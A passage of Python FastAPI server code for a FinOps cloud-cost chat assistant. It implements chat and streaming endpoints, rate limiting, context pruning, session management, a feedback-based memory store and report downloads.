        if fallback in ("gemini", "openai", "anthropic") and not (cfg.get(env_map.get(fallback)) or os.environ.get(env_map.get(fallback))):
            fallback = "direct"
        set_engine(EngineSelection(engine=fallback))
        new_engine = fallback
        switched = True

    logger.info(f"🗑️ [Token Cleared] Unconfigured token for engine: {engine}")
    return {
        "status": "ok",
        "unconfigured": engine,
        "active_engine": new_engine,
        "switched": switched
    }

class ChatRequest(BaseModel):
    message: str = Field(..., max_length=131072)  # 128 KB ceiling (security: L3)
    session_id: Optional[str] = None
    sessionId: Optional[str] = None
    history: Optional[list[dict]] = Field(None, max_length=100)  # bounded: each turn is replayed to the LLM
    stream: Optional[bool] = False
    save_history: Optional[bool] = True
    ephemeral: Optional[bool] = False
    include_insights: Optional[bool] = None

class ToolCallLog(BaseModel):
    tool: str
    arguments: dict
    result_snippet: str

class ChatResponse(BaseModel):
    response: str
    thinking: Optional[str] = None
    session_id: str
    tool_calls: list[ToolCallLog]
    title: Optional[str] = None
    duration_secs: Optional[float] = None
    tokens: Optional[int] = None
    tokens_per_sec: Optional[float] = None
    suggested_chips: Optional[list[str]] = None

class GranularityRequest(BaseModel):
    session_id: str
    message_index: Optional[int] = None
    target_granularity: str = Field(..., pattern="^(monthly|weekly|daily)$")
    month_ref: Optional[str] = None
    prompt: Optional[str] = None
    include_insights: Optional[bool] = None
    force_refresh: Optional[bool] = False

def generate_finops_followup_chips(prompt: str, response: str, tool_calls: list = None) -> list[str]:
    """
    Generates dynamic, data-aware suggestion pills rendered under assistant data bubbles.
    Extracts high-value FinOps entities (top cluster, namespace, model, anomaly, service, customer)
    from markdown tables and telemetry context.
    """
    chips = []
    rlow = (response or "").lower()
    plow = (prompt or "").lower()

    table_headers = []
    first_row_cells = []
    
    for line in (response or "").splitlines():
        line = line.strip()
        if line.startswith("|") and line.endswith("|"):
            parts = [p.strip() for p in line.split("|")[1:-1]]
            if not parts:
                continue
            if not table_headers and not any(set(p) <= {"-", ":"} for p in parts):
                table_headers = [p.lower() for p in parts]
            elif table_headers and any(set(p) <= {"-", ":"} for p in parts):
                continue
            elif table_headers and not first_row_cells:
                first_row_cells = parts
                break

    top_entity = None
    entity_col = None
    if table_headers and first_row_cells:
        for idx, h in enumerate(table_headers):
            if idx < len(first_row_cells):
                val = first_row_cells[idx].strip().strip("`").strip("*")
                if not val or val.lower() in ("total", "all", "unknown", "—", "-"):
                    continue
                if any(k in h for k in ["cluster", "k8s cluster"]):
                    return [f"🔍 Drill into {val} by namespace", f"📊 Workload breakdown for {val}", "📉 3-Month K8s Cost Trend"]
                elif any(k in h for k in ["ai model", "foundation model", "model name"]):
                    return [f"🤖 Drill into {val} token volume", f"⚡ Compare {val} vs Claude 3.5 Sonnet", "💡 Model routing & caching levers"]
                elif any(k in h for k in ["anomaly", "cost spike", "impacted service"]) or ("variance" in h and "service" in h):
                    return [f"🚨 Triage {val} Spike", "📉 60-Day Anomaly History", "💰 Impacted Accounts & Owners"]
                elif any(k in h for k in ["from location", "source location", "egress"]):
                    return ["🌐 NAT Gateway vs S3 VPC Endpoint savings", "📍 Egress cost by destination region", "💡 Inter-AZ chatterbox triage"]
                elif any(k in h for k in ["commitment plan", "pricing category", "lease type", "commitment coverage"]):
                    return ["⏳ 30-60-90 Day Expiration Cliffs", "📉 Unused Commitment Waste", "🎯 Target 80% Coverage Plan"]
                elif any(k in h for k in ["service name", "service", "cost driver"]):
                    if not top_entity:
                        top_entity = val
                        entity_col = "service"
                elif any(k in h for k in ["customer name", "channel customer", "customer"]):
                    if not top_entity:
                        top_entity = val
                        entity_col = "customer"

    if top_entity:
        if entity_col == "service":
            return [f"🔍 Drill into {top_entity} by usage type", f"📉 Show monthly trend for {top_entity}", f"💡 Rightsizing levers for {top_entity}"]
        elif entity_col == "customer":
            return [f"Show top cloud services for {top_entity}", f"Compare {top_entity} with previous month", f"Show Azure spend for {top_entity}"]

    if any(w in rlow or w in plow for w in ["kubernetes", "k8s", "container", "cluster"]):
        return ["Show Kubernetes cost breakdown by cluster and namespace", "Show Kubernetes top namespaces", "Show 3-Month K8s Trend"]
    elif any(w in rlow or w in plow for w in ["anomaly", "anomalies", "spike", "unusual spend"]):
        return ["Show active cost anomalies across my clouds", "Show resolved anomalies", "Show cost spikes above $5,000"]
    elif any(w in rlow or w in plow for w in ["ai spend", "foundation model", "tokenomics", "tokens"]):
        return ["Show AI spend by foundation model across all clouds", "Show token usage by model", "Show AI cost by cloud provider"]
    elif any(w in rlow or w in plow for w in ["commitment", "savings plan", "reservation", "lease type"]):
        return ["Show commitment portfolio and upcoming expiration cliffs", "Show commitment coverage by cloud", "Show unused reservations"]
    elif any(w in rlow or w in plow for w in ["egress", "data transfer", "network", "nat gateway"]):
        return ["Show data transfer and network egress costs by location", "NAT Gateway vs S3 VPC Endpoint savings", "Inter-AZ transfer costs"]
    elif any(w in rlow or w in plow for w in ["unit economics", "cost per token", "cost per tenant", "cost per vcpu"]):
        return ["Show unit economics and cost per 1M tokens", "Show cost per tenant", "Show cost per vCPU-hour"]
    elif "azure" in rlow:
        return ["Show top Azure services", "Show Azure VM spend by instance type", "Show active cost anomalies"]
    elif "gcp" in rlow:
        return ["Show top GCP services", "Show BigQuery spend", "Show active cost anomalies"]
    elif "aws" in rlow:
        return ["Show top AWS services", "Show EC2 spend", "Show active cost anomalies"]
    else:
        return ["Top cloud services across all clouds", "Show active cost anomalies", "Show commitment portfolio and upcoming expiration cliffs"]

_cancelled_sessions: set[str] = set()

class StopChatRequest(BaseModel):
    session_id: Optional[str] = None

@app.post("/chat/stop")
def stop_chat(req: StopChatRequest):
    if req.session_id:
        _cancelled_sessions.add(req.session_id)
        logger.info(f"[Chat] Stop signal received for session: {req.session_id}")
    return {"status": "ok", "stopped": True}

from collections import defaultdict

# Simple in-memory rate limiter (stdlib, zero external deps)
_rate_limit_lock = threading.Lock()
_request_history = defaultdict(list)
RATE_LIMIT_MAX_REQUESTS = 60  # 60 requests per minute per IP
RATE_LIMIT_WINDOW_SECS = 60

def _check_rate_limit(client_ip: str, max_requests: int = RATE_LIMIT_MAX_REQUESTS) -> bool:
    now = time.time()
    with _rate_limit_lock:
        timestamps = _request_history[client_ip]
        while timestamps and timestamps[0] < now - RATE_LIMIT_WINDOW_SECS:
            timestamps.pop(0)
        if len(timestamps) >= max_requests:
            return False
        timestamps.append(now)
        return True


def _limit_expensive(request: Request, bucket: str, per_minute: int = 10):
    """Throttle endpoints that hit the network or spawn installs/downloads (429 when exceeded)."""
    ip = request.client.host if request.client else "127.0.0.1"
    if not _check_rate_limit(f"{ip}:{bucket}", per_minute):
        raise HTTPException(status_code=429, detail="Too many requests. Please slow down.")


def prune_messages_to_context_budget(messages: list[dict], max_tokens: int = 28000, min_recent_turns: int = 4) -> list[dict]:
    """Ensures conversation history fits safely within LLM context window while preserving system prompt and latest turns."""
    if not messages:
        return messages
    sys_msg = [messages[0]] if messages[0].get("role") == "system" else []
    chat_msgs = messages[1:] if sys_msg else messages[:]

    total = sum(estimate_token_count(m.get("content", "")) for m in sys_msg + chat_msgs)
    if total <= max_tokens or len(chat_msgs) <= 2:
        return messages

    kept = []
    current_tokens = sum(estimate_token_count(m.get("content", "")) for m in sys_msg)
    # If system prompt alone consumes most/all of max_tokens, ensure chat history
    # has an effective budget rather than starving it down to 1 message.
    effective_max = (
        max(max_tokens, current_tokens + 4000)
        if max_tokens >= 4000 and current_tokens >= max_tokens - 2000
        else max_tokens
    )

    for m in reversed(chat_msgs):
        m_tokens = estimate_token_count(m.get("content", ""))
        can_break = len(kept) >= min_recent_turns if max_tokens >= 4000 else bool(kept)
        if can_break and (current_tokens + m_tokens > effective_max):
            break
        kept.append(m)
        current_tokens += m_tokens
    kept.reverse()
    return sys_msg + kept


@app.post("/chat", response_model=None)
def chat(req: ChatRequest, request: Request):
    client_ip = request.client.host if request.client else "127.0.0.1"
    if not _check_rate_limit(client_ip):
        raise HTTPException(status_code=429, detail="Too many chat requests. Please slow down.")

    global _mcp, _ai, _tools, _last_activity, _active_chats_count
    _last_activity = time.time()  # reset idle watchdog countdown
    _active_chats_count += 1
    if not _mcp or not _tools:
        if not init_mcp_if_authenticated():
            raise HTTPException(
                status_code=401, 
                detail="CloudHealth MCP is disconnected. Sign in to the platform to continue."
            )

    if not _ai:
        raise HTTPException(status_code=503, detail="AI engine is initializing.")

    # ponytail: reset fallback flag each request so transient errors don't permanently poison channelCustomerId queries
    if _mcp:
        _mcp._use_fallback = False

    is_ephemeral = bool(
        req.save_history is False
        or req.ephemeral
        or request.headers.get("x-cleo-ephemeral") == "true"
        or request.headers.get("x-cleo-test") == "true"
        or (req.session_id and str(req.session_id).lower().startswith(("test-", "test_", "probe-")))
    )

    # Session continuity (like Gemini):
    # If session_id is omitted, empty, or "active", continue the most recent ongoing session.
    # Only spawn a new session if "new" is explicitly requested or if no session exists yet.
    session_id = req.session_id or req.sessionId
    if not is_ephemeral and session_id in (None, "", "active", "current"):
        session_id = _get_active_session_id()
    if not session_id or session_id == "new" or (not is_ephemeral and not _is_valid_guid(session_id)):
        session_id = str(uuid.uuid4())

    _cancelled_sessions.discard(session_id)
    now_iso = datetime.now(timezone.utc).isoformat()

    _engine_label = _ai.get_engine_display_name() if _ai and hasattr(_ai, "get_engine_display_name") else None
    session_pool = _ephemeral_sessions if is_ephemeral else _sessions
    if session_id not in session_pool:
        title = _generate_chat_title(req.message)
        session_entry = {
            "id": session_id,
            "title": title,
            "created_at": now_iso,
            "updated_at": now_iso,
            "messages": [
                {"role": "system", "content": build_system_prompt(_tools, engine_label=_engine_label)}
            ]
        }
        if req.history:
            for h in req.history:
                if h.get("role") in ("user", "assistant") and isinstance(h.get("content"), str) and h["content"]:
                    session_entry["messages"].append({"role": h["role"], "content": h["content"][:131072]})
        session_pool[session_id] = session_entry
    else:
        session_entry = session_pool[session_id]

    if isinstance(session_entry, list):
        session_entry = _normalize_session(session_id, session_entry)
        session_pool[session_id] = session_entry

    messages = session_entry["messages"]

    # Refresh system prompt with live real-time calendar, prompt rules, and active engine
    if messages and messages[0].get("role") == "system":
        messages[0]["content"] = build_system_prompt(_tools, engine_label=_engine_label)

    # Auto-title session if it was previously untitled
    if session_entry.get("title") in ("New Conversation", "New Chat", "Untitled Chat", ""):
        session_entry["title"] = _generate_chat_title(req.message)

    messages.append({"role": "user", "content": req.message})
    session_entry["updated_at"] = now_iso

    # ── /teach shortcut: write directly to memory, skip LLM ──────────────────
    _teach_m = re.match(r'^/teach[:\s]+(.+)', req.message.strip(), re.IGNORECASE | re.DOTALL)
    if _teach_m:
        instruction = _teach_m.group(1).strip()
        _get_memory().record_correction("general", instruction)
        _teach_reply = (
            f"✅ **Cleo learned:** {instruction}\n\n"
            "*This correction is now stored in memory and will influence future responses.*"
        )
        messages.append({"role": "assistant", "content": _teach_reply})
        session_entry["updated_at"] = datetime.now(timezone.utc).isoformat()
        if not is_ephemeral:
            _save_sessions()
        return Response(
            content=json.dumps({"response": _teach_reply, "session_id": session_id, "tool_calls": []}),
            media_type="application/json"
        )

    tool_log: list[ToolCallLog] = []
    original_call_tool = _mcp.call_tool

    if req.stream:
        import queue
        q = queue.Queue()
        done_marker = object()

        def tracked_call_tool(name: str, arguments: dict) -> dict:
            if session_id in _cancelled_sessions:
                raise RuntimeError("Query cancelled by user.")
            q.put({"type": "status", "message": f"Querying {name}..."})
            result = original_call_tool(name, arguments)
            tool_log.append(ToolCallLog(
                tool=name,
                arguments=arguments,
                result_snippet=str(result)[:400]
            ))
            return result

        _mcp.call_tool = tracked_call_tool

        def worker():
            t0 = time.perf_counter()
            try:
                def on_token(token: str):
                    q.put({"type": "delta", "content": token})

                def on_status(status: str):
                    q.put({"type": "status", "message": status})

                active_messages = prune_messages_to_context_budget(messages)
                response = run_agent_turn(
                    _mcp, _ai, active_messages,
                    on_token=on_token,
                    on_status=on_status,
                    include_insights=req.include_insights
                )
                duration_secs = max(0.01, round(time.perf_counter() - t0, 2))
                stats = getattr(_ai, "last_stats", {}) or {}
                total_tokens = stats.get("tokens") or (stats.get("prompt_tokens", 0) + stats.get("completion_tokens", 0))
                if not total_tokens:
                    p_tok = estimate_token_count(" ".join([m.get("content", "") for m in messages if isinstance(m, dict)]))
                    c_tok = estimate_token_count(response)
                    total_tokens = p_tok + c_tok
                    tokens_per_sec = round(c_tok / max(duration_secs, 0.05), 1)
                else:
                    tokens_per_sec = stats.get("tokens_per_sec") or round(stats.get("completion_tokens", total_tokens) / max(duration_secs, 0.05), 1)

                now_ts = int(datetime.now(timezone.utc).timestamp())
                thinking = getattr(_ai, "last_thinking", "") or ""
                clean_resp, extra_thinking = split_thinking_and_response(response)
                if extra_thinking:
                    thinking = (thinking + "\n\n" + extra_thinking).strip() if thinking else extra_thinking
                    response = clean_resp

                messages.append({
                    "role": "assistant",
                    "content": response,
                    "thinking": thinking,
                    "timestamp": now_ts,
                    "duration_secs": duration_secs,
                    "tokens": total_tokens,
                    "tokens_per_sec": tokens_per_sec,
                    "tool_calls": [t.model_dump() if hasattr(t, "model_dump") else t.dict() for t in tool_log]
                })

                if len(messages) > 40:
                    messages[:] = [messages[0]] + messages[-30:]

                session_entry["updated_at"] = datetime.now(timezone.utc).isoformat()
                if not is_ephemeral:
                    _save_sessions()

                q.put({
                    "type": "done",
                    "response": response,
                    "thinking": thinking,
                    "session_id": session_id,
                    "tool_calls": [t.model_dump() if hasattr(t, "model_dump") else t.dict() for t in tool_log],
                    "title": session_entry.get("title"),
                    "duration_secs": duration_secs,
                    "tokens": total_tokens,
                    "tokens_per_sec": tokens_per_sec,
                })
            except Exception as e:
                if session_id in _cancelled_sessions or "cancelled by user" in str(e).lower():
                    logger.info(f"[Chat] Query cancelled by user for session {session_id}")
                    if messages and messages[-1].get("role") == "user" and messages[-1].get("content") == req.message:
                        messages.pop()
                    q.put({"type": "cancelled", "message": "Query cancelled by user."})
                else:
                    logger.error(f"[Chat] Streaming generation error: {e}", exc_info=True)
                    q.put({"type": "error", "error": str(e)})
            finally:
                _mcp.call_tool = original_call_tool
                _cancelled_sessions.discard(session_id)
                q.put(done_marker)

        worker_thread = threading.Thread(target=worker, daemon=True)
        worker_thread.start()

        def event_generator():
            try:
                while True:
                    try:
                        item = q.get(timeout=0.05)
                    except queue.Empty:
                        if not worker_thread.is_alive():
                            break
                        continue
                    if item is done_marker:
                        break
                    yield f"data: {json.dumps(item)}\n\n"
            finally:
                global _active_chats_count
                _active_chats_count = max(0, _active_chats_count - 1)

        return StreamingResponse(
            event_generator(),
            media_type="text/event-stream",
            headers={
                "Cache-Control": "no-cache",
                "Connection": "keep-alive",
                "X-Accel-Buffering": "no",
            }
        )

    def tracked_call_tool(name: str, arguments: dict) -> dict:
        if session_id in _cancelled_sessions:
            raise RuntimeError("Query cancelled by user.")
        result = original_call_tool(name, arguments)
        tool_log.append(ToolCallLog(
            tool=name,
            arguments=arguments,
            result_snippet=str(result)[:400]
        ))
        return result

    _mcp.call_tool = tracked_call_tool
    t0 = time.perf_counter()
    try:
        active_messages = prune_messages_to_context_budget(messages)
        response = run_agent_turn(
            _mcp, _ai, active_messages,
            include_insights=req.include_insights
        )
    except Exception as e:
        if session_id in _cancelled_sessions or "cancelled by user" in str(e).lower():
            logger.info(f"[Chat] Query cancelled by user for session {session_id}")
            if messages and messages[-1].get("role") == "user" and messages[-1].get("content") == req.message:
                messages.pop()
            raise HTTPException(status_code=499, detail="Query cancelled by user.")
        raise
    finally:
        _active_chats_count = max(0, _active_chats_count - 1)
        _mcp.call_tool = original_call_tool
        _cancelled_sessions.discard(session_id)

    duration_secs = max(0.01, round(time.perf_counter() - t0, 2))
    stats = getattr(_ai, "last_stats", {}) or {}
    total_tokens = stats.get("tokens") or (stats.get("prompt_tokens", 0) + stats.get("completion_tokens", 0))
    if not total_tokens:
        p_tok = estimate_token_count(" ".join([m.get("content", "") for m in messages if isinstance(m, dict)]))
        c_tok = estimate_token_count(response)
        total_tokens = p_tok + c_tok
        tokens_per_sec = round(c_tok / max(duration_secs, 0.05), 1)
    else:
        tokens_per_sec = stats.get("tokens_per_sec") or round(stats.get("completion_tokens", total_tokens) / max(duration_secs, 0.05), 1)

    now_ts = int(datetime.now(timezone.utc).timestamp())

    # Separate any internal reasoning / thinking process so the UI stays clean
    thinking = getattr(_ai, "last_thinking", "") or ""
    clean_resp, extra_thinking = split_thinking_and_response(response)
    if extra_thinking:
        thinking = (thinking + "\n\n" + extra_thinking).strip() if thinking else extra_thinking
        response = clean_resp

    # Persist assistant response to session messages for multi-turn conversational context
    messages.append({
        "role": "assistant",
        "content": response,
        "thinking": thinking,  # Preserved for export and troubleshooting
        "timestamp": now_ts,
        "duration_secs": duration_secs,
        "tokens": total_tokens,
        "tokens_per_sec": tokens_per_sec,
        "tool_calls": [t.model_dump() if hasattr(t, "model_dump") else t.dict() for t in tool_log]
    })

    if len(messages) > 40:
        messages[:] = [messages[0]] + messages[-30:]

    session_entry["updated_at"] = datetime.now(timezone.utc).isoformat()
    if not is_ephemeral:
        _save_sessions()

    suggested_chips = generate_finops_followup_chips(req.message, response, tool_log)

    return ChatResponse(
        response=response,
        thinking=thinking,
        session_id=session_id,
        tool_calls=tool_log,
        title=session_entry.get("title"),
        duration_secs=duration_secs,
        tokens=total_tokens,
        tokens_per_sec=tokens_per_sec,
        suggested_chips=suggested_chips
    )


@app.post("/api/chat/granularity")
def switch_chat_granularity(req: GranularityRequest, request: Request):
    global _mcp, _ai, _tools, _last_activity
    _last_activity = time.time()
    if not _mcp or not _tools:
        if not init_mcp_if_authenticated():
            raise HTTPException(status_code=401, detail="CloudHealth MCP is disconnected.")
    if not _ai:
        raise HTTPException(status_code=503, detail="AI engine is initializing.")

    session_pool = _sessions
    session_entry = session_pool.get(req.session_id)
    if not session_entry:
        session_entry = _ephemeral_sessions.get(req.session_id)
    if not session_entry:
        raise HTTPException(status_code=404, detail="Session not found.")

    if isinstance(session_entry, list):
        session_entry = _normalize_session(req.session_id, session_entry)
        session_pool[req.session_id] = session_entry

    messages = session_entry.get("messages", [])
    if not messages:
        raise HTTPException(status_code=400, detail="No messages in session.")

    assistant_indices = [i for i, m in enumerate(messages) if m.get("role") == "assistant"]
    if not assistant_indices:
        raise HTTPException(status_code=400, detail="No assistant message found to change granularity.")

    if req.message_index is not None and 0 <= req.message_index < len(assistant_indices):
        asst_idx = assistant_indices[req.message_index]
    elif req.message_index is not None and 0 <= req.message_index < len(messages) and messages[req.message_index].get("role") == "assistant":
        asst_idx = req.message_index
    else:
        asst_idx = assistant_indices[-1]

    asst_msg = messages[asst_idx]
    if not isinstance(asst_msg.get("granularities"), dict):
        curr_content = asst_msg.get("content", "")
        curr_gran = "monthly"
        if "weekly" in curr_content.lower() or "iso calendar weeks" in curr_content.lower():
            curr_gran = "weekly"
        elif "daily" in curr_content.lower() or "day-over-day" in curr_content.lower() or "active days" in curr_content.lower():
            curr_gran = "daily"
        asst_msg["granularities"] = {curr_gran: curr_content}
        asst_msg["default_granularity"] = curr_gran
        asst_msg["active_granularity"] = curr_gran

    target_gran = req.target_granularity.lower().strip()
    # Check if target granularity is already in cache
    if not req.force_refresh and target_gran in asst_msg["granularities"]:
        cached_md = asst_msg["granularities"][target_gran]
        asst_msg["content"] = cached_md
        asst_msg["active_granularity"] = target_gran
        _save_sessions()
        return {
            "success": True,
            "cached": True,
            "granularity": target_gran,
            "markdown": cached_md,
            "session_id": req.session_id,
            "message_index": asst_idx
        }

    # Not cached: query CloudHealth telemetry for this granularity
    hist = messages[:asst_idx]
    if req.prompt:
        gran_prompt = req.prompt
    elif req.month_ref:
        gran_prompt = f"Show this spend with {target_gran} granularity {req.month_ref}".strip()
    else:
        gran_prompt = f"Show this spend with {target_gran} granularity"

    query_messages = hist + [{"role": "user", "content": gran_prompt}]
    active_messages = prune_messages_to_context_budget(query_messages)

    response = run_agent_turn(_mcp, _ai, active_messages, include_insights=req.include_insights)
    clean_resp, extra_thinking = split_thinking_and_response(response)
    if not clean_resp and response:
        clean_resp = response

    asst_msg["granularities"][target_gran] = clean_resp
    asst_msg["content"] = clean_resp
    asst_msg["active_granularity"] = target_gran
    session_entry["updated_at"] = datetime.now(timezone.utc).isoformat()
    _save_sessions()

    return {
        "success": True,
        "cached": False,
        "granularity": target_gran,
        "markdown": clean_resp,
        "session_id": req.session_id,
        "message_index": asst_idx
    }


@app.get("/api/sessions/search")
def search_sessions(q: str = ""):
    query = q.strip().lower()
    if not query:
        return {"results": []}
    results = []
    for sid, s in _sessions.items():
        if isinstance(s, list):
            s = _normalize_session(sid, s)
            _sessions[sid] = s
        title = s.get("title", "")
        matched_messages = []
        for m in s.get("messages", []):
            content = m.get("content", "")
            if query in content.lower():
                idx = content.lower().find(query)
                start = max(0, idx - 40)
                end = min(len(content), idx + len(query) + 60)
                snippet = ("..." if start > 0 else "") + content[start:end].strip() + ("..." if end < len(content) else "")
                matched_messages.append({
                    "role": m.get("role"),
                    "snippet": snippet,
                    "timestamp": m.get("timestamp")
                })
        if query in title.lower() or matched_messages:
            results.append({
                "id": sid,
                "guid": sid,
                "url": f"/chat/{sid}",
                "title": title,
                "updated_at": s.get("updated_at", ""),
                "matches": matched_messages[:5]
            })
    return {"results": results, "query": q}


@app.get("/api/sessions")
def list_sessions():
    summaries = []
    sorted_items = sorted(
        _sessions.items(),
        key=lambda item: (
            1 if (isinstance(item[1], dict) and item[1].get("pinned")) else 0,
            item[1].get("updated_at", "") if isinstance(item[1], dict) else ""
        ),
        reverse=True
    )
    for sid, s in sorted_items[:MAX_SAVED_SESSIONS]:
        if isinstance(s, list):
            s = _normalize_session(sid, s)
            _sessions[sid] = s
        msgs = [m for m in s.get("messages", []) if m.get("role") in ("user", "assistant")]
        msg_count = len(msgs)
        last_msg = ""
        for m in reversed(msgs):
            if m.get("content"):
                last_msg = m["content"][:100]
                break
        summaries.append({
            "id": sid,
            "guid": sid,
            "url": f"/chat/{sid}",
            "title": s.get("title", "New Conversation"),
            "created_at": s.get("created_at", ""),
            "updated_at": s.get("updated_at", ""),
            "message_count": msg_count,
            "preview": last_msg,
            "pinned": bool(s.get("pinned", False))
        })
    return {"sessions": summaries, "total": len(_sessions), "max_limit": MAX_SAVED_SESSIONS}

@app.get("/api/session/{session_id}")
def get_session(session_id: str):
    if session_id not in _sessions:
        raise HTTPException(status_code=404, detail="Session not found")
    s = _sessions[session_id]
    if isinstance(s, list):
        s = _normalize_session(session_id, s)
        _sessions[session_id] = s
    client_messages = []
    for m in s.get("messages", []):
        if m.get("role") not in ("user", "assistant"):
            continue
        item = {
            "role": m["role"],
            "content": m["content"],
            "timestamp": m.get("timestamp"),
            "duration_secs": m.get("duration_secs"),
            "tokens": m.get("tokens"),
            "tokens_per_sec": m.get("tokens_per_sec"),
            "tool_calls": m.get("tool_calls", []),
            "granularities": m.get("granularities", {}),
            "default_granularity": m.get("default_granularity"),
            "active_granularity": m.get("active_granularity")
        }
        if item["role"] == "assistant":
            if item["tokens"] is None and item["content"]:
                item["tokens"] = estimate_token_count(item["content"])
            if item["duration_secs"] is None and item["tokens"]:
                item["duration_secs"] = max(0.6, round(item["tokens"] / 75.0, 1))
            if item["tokens_per_sec"] is None and item["duration_secs"] and item["tokens"]:
                item["tokens_per_sec"] = round(item["tokens"] / item["duration_secs"], 1)
        client_messages.append(item)
    return {
        "id": session_id,
        "guid": session_id,
        "url": f"/chat/{session_id}",
        "title": s.get("title", "New Conversation"),
        "created_at": s.get("created_at", ""),
        "updated_at": s.get("updated_at", ""),
        "messages": client_messages,
        "pinned": bool(s.get("pinned", False))
    }

@app.post("/api/session/{session_id}/pin")
def toggle_pin_session(session_id: str):
    if session_id not in _sessions:
        raise HTTPException(status_code=404, detail="Session not found")
    s = _sessions[session_id]
    if isinstance(s, list):
        s = _normalize_session(session_id, s)
        _sessions[session_id] = s
    s["pinned"] = not s.get("pinned", False)
    _save_sessions()
    return {"status": "ok", "session_id": session_id, "pinned": s["pinned"]}

@app.delete("/session/{session_id}")
@app.delete("/api/session/{session_id}")
def clear_session(session_id: str):
    if session_id in _sessions:
        del _sessions[session_id]
        _save_sessions()
    return {"status": "cleared", "session_id": session_id}

@app.delete("/api/sessions")
def clear_all_sessions():
    _sessions.clear()
    _save_sessions()
    return {"status": "cleared", "total": 0}

class BulkDeleteSessionsRequest(BaseModel):
    session_ids: list[str]

@app.post("/api/sessions/bulk-delete")
@app.delete("/api/sessions/bulk-delete")
def bulk_delete_sessions(req: BulkDeleteSessionsRequest):
    deleted = []
    for sid in req.session_ids:
        if sid in _sessions:
            del _sessions[sid]
            deleted.append(sid)
    if deleted:
        _save_sessions()
    return {"status": "cleared", "deleted": deleted, "count": len(deleted), "remaining": len(_sessions)}

# ── Self-Learning Memory ───────────────────────────────────────────────────────

from cleo_memory import get_memory as _get_memory

class FeedbackRequest(BaseModel):
    session_id: str
    message_index: int
    rating: str          # "good" | "bad"
    correction: Optional[str] = None   # filled when rating == "bad"

@app.post("/api/feedback")
def submit_feedback(req: FeedbackRequest):
    mem = _get_memory()
    session = _sessions.get(req.session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")

    msgs = session.get("messages", [])
    user_msgs  = [m for m in msgs if m.get("role") == "user"]
    asst_msgs  = [m for m in msgs if m.get("role") == "assistant"]
    
    idx = req.message_index
    target_asst = None
    user_query = ""

    # Priority 1: Match directly by message index in session messages list
    if 0 <= idx < len(msgs):
        if msgs[idx].get("role") == "assistant":
            target_asst = msgs[idx]
            u_before = [m for m in msgs[:idx] if m.get("role") == "user"]
            if u_before:
                user_query = u_before[-1].get("content", "")
        elif msgs[idx].get("role") == "user":
            user_query = msgs[idx].get("content", "")
            a_after = [m for m in msgs[idx:] if m.get("role") == "assistant"]
            if a_after:
                target_asst = a_after[0]

    # Priority 2: Fallback to user_msgs and asst_msgs lists
    if not user_query:
        if 0 <= idx < len(user_msgs):
            user_query = user_msgs[idx].get("content", "")
        elif idx - 1 >= 0 and idx - 1 < len(user_msgs):
            user_query = user_msgs[idx - 1].get("content", "")
        elif user_msgs:
            user_query = user_msgs[-1].get("content", "")

    if target_asst is None:
        if 0 <= idx < len(asst_msgs):
            target_asst = asst_msgs[idx]
        elif idx - 1 >= 0 and idx - 1 < len(asst_msgs):
            target_asst = asst_msgs[idx - 1]
        elif asst_msgs:
            target_asst = asst_msgs[-1]

    # Annotate message in active session state
    if target_asst is not None:
        target_asst["voted"] = req.rating
        if req.correction:
            target_asst["correction"] = req.correction

    asst_reply = target_asst.get("content", "") if target_asst else ""

    if req.rating == "good":
        summary = asst_reply[:200].replace("\n", " ").strip()
        if user_query:
            mem.record_good_pattern(user_query, summary)
        _save_sessions()
        return {"status": "recorded", "type": "good_pattern"}
    elif req.rating == "bad":
        if req.correction:
            mem.record_correction(user_query, req.correction)
            from cleo_query import extract_target_dataset
            explicit_ds = extract_target_dataset(req.correction)
            if explicit_ds and user_query:
                mem.record_rule(
                    f"When asked '{user_query}', query data from {explicit_ds} dataset.",
                    search_keywords=f"{user_query} {explicit_ds} dataset"
                )
            _save_sessions()
            return {"status": "recorded", "type": "correction"}
        else:
            # Standalone thumbs-down: log negative feedback so the model/agent avoids repeating this response
            summary = asst_reply[:200].replace("\n", " ").strip()
            mem.record_negative_feedback(user_query, summary)
            _save_sessions()
            return {"status": "recorded", "type": "negative_feedback"}

    return {"status": "ignored"}

@app.get("/api/memory")
def get_memory_entries():
    return {"entries": _get_memory().all_entries()}

@app.delete("/api/memory/{entry_id}")
def delete_memory_entry(entry_id: str):
    deleted = _get_memory().delete(entry_id)
    if not deleted:
        raise HTTPException(status_code=404, detail="Entry not found")
    return {"status": "deleted"}

# ── Client Deliverables (.xlsx, .pptx, .html) ─────────────────────────────────

@app.get("/api/deliverables/download/{file_type}")
def download_deliverable(file_type: str, session_id: Optional[str] = None, refresh: bool = False):
    out_dir = os.path.join(_base_dir, "client_deliverables")
    os.makedirs(out_dir, exist_ok=True)
    if file_type in ("drivers-dashboard", "drivers-xlsx", "drivers"):
        fname = "CloudHealth_cloud_drivers_dashboard.xlsx"
        media_type = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        file_path = os.path.join(out_dir, fname)
        if refresh or not os.path.exists(file_path):
            import subprocess
            script_path = os.path.join(_base_dir, "scripts", "generate_drivers_dashboard.py")
            subprocess.run([sys.executable, script_path, file_path], check=True)
        return FileResponse(file_path, media_type=media_type, filename=fname)
    elif file_type == "drivers-gs":
        fname = "CloudHealthDriversDashboard.gs"
        media_type = "text/plain"
        file_path = os.path.join(out_dir, fname)
        return FileResponse(file_path, media_type=media_type, filename=fname)
    elif file_type == "drivers-telemetry":
        cache_fp = os.path.join(out_dir, ".cache", "cloudhealth_monthly_telemetry.json")
        if os.path.exists(cache_fp):
            with open(cache_fp, "r") as f:
                return json.load(f)
        return {"rows": []}
    elif file_type not in ("pptx", "xlsx", "html"):
        raise HTTPException(status_code=400, detail="Invalid file type. Supported: pptx, xlsx, html, drivers-dashboard, drivers-gs, drivers-telemetry")

    media_types = {
        "pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "html": "text/html"
    }
    media_type = media_types[file_type]

    # Resolve target directory (isolated per session to prevent cross-chat data collisions)
    if session_id:
        safe_sid = re.sub(r'[^a-zA-Z0-9_-]', '_', session_id)
        target_dir = os.path.join(out_dir, "sessions", safe_sid)
    else:
        target_dir = out_dir
    os.makedirs(target_dir, exist_ok=True)

    try:
        import importlib.util
        exp_script = os.path.join(_base_dir, "scripts", "export_deliverables.py")
        spec = importlib.util.spec_from_file_location("export_deliverables_mod", exp_script)
        exp_mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(exp_mod)
        
